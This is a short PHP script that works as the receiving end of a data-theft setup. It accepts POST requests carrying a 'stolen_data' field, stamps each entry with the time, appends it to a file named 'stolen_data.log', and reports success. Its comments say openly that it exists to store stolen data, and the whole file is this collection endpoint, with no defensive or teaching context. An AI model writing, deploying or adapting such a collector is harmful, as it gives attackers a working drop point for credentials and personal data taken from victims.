<?php
// Log file to store stolen data
$log_file = "stolen_data.log";

// Check if the request method is POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get stolen data from POST request
    $stolen_data = $_POST["stolen_data"] ?? "No Data";

    // Format the log entry with a timestamp
    $log_entry = "[" . date("Y-m-d H:i:s") . "] " . $stolen_data . "\n";

    // Append the stolen data to the log file
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

    echo "[+] Data saved successfully!";
} else {
    echo "[-] Invalid request.";
}
?>
